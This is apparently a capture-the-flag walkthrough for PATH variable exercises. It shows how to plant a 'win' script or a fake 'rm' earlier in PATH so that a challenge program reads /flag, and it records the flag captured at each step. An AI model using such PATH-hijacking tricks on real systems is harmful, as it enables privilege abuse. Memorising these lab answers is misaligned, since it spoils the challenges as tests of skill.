### The PATH Variable

1. **Clear the PATH:**
   ```bash
   PATH=""
   ```

2. **Run the Program:**
   ```bash
   /challenge/run
   ```

**Flag:** VhEo3V4p7WZ2qThTnVQdWQY7Uq.wWwFhJQY4pvA0pvJ
---

### Setting PATH

1. **Set the PATH:**
   ```bash
   PATH=/challenge/more_commands
   ```

2. **Run the Program:**
   ```bash
   /challenge/run
   ```

**Flag:** VZFDDcZJQdA3V6wKHEwIYFqWqHk.wIhAdLQY4pvA0pvJ

---

### Adding Commands

1. **Method 1: Locating the cat Command**
   - **Find the Location of `cat`:**
     ```bash
     which cat
     ```

   - **Create the win Script:**
     ```bash
     echo '/usr/bin/cat /flag' > win
     ```

   - **Update the PATH:**
     ```bash
     export PATH=$PATH:./
     ```

   - **Run the Program:**
     ```bash
     /challenge/run
     ```

   **Flag:** 8lJd6gEhpB4DfhVQ7V4sJkJbHq.wWwFhJQY4pvA0pvJ

2. **Method 2: Adding Current Directory to PATH**
   - **Update the PATH:**
     ```bash
     export PATH=$PATH:./
     ```

   - **Create the win Script:**
     ```bash
     echo 'cat /flag' > win
     ```

   - **Run the Program:**
     ```bash
     /challenge/run
     ```

   **Flag:** 8lJd6gEhpB4DfhVQ7V4sJkJbHq.wWwFhJQY4pvA0pvJ

3. **Method 3: Using `read` to Access the Flag**
   - **Create the win Script with `read`:**
     ```bash
     echo 'read flag < /flag; echo $flag' > win
     ```

   - **Update the PATH:**
     ```bash
     export PATH=$PATH:./
     ```

   - **Run the Program:**
     ```bash
     /challenge/run
     ```

   **Flag:** 8lJd6gEhpB4DfhVQ7V4sJkJbHq.wWwFhJQY4pvA0pvJ

---

### Hijacking Commands

1. **Create a Custom `rm` Command:**
   ```bash
   echo -e '#!/bin/bash\n# Custom rm command to do nothing\nexit 0' > rm
   ```

2. **Update the PATH:**
   ```bash
   export PATH=~/:$PATH
   ```

3. **Run the Program:**
   ```bash
   /challenge/run
   ```

4. **Modify the Custom `rm` Command to Display the Flag:**
   ```bash
   echo "cat /flag" > rm
   ```

5. **Run the Program Again:**
   ```bash
   /challenge/run
   ```

**Flag:**  854e0YQnWJUGJxqWgCqEwK9W22u.wWwFhJQY5pv9qvJ
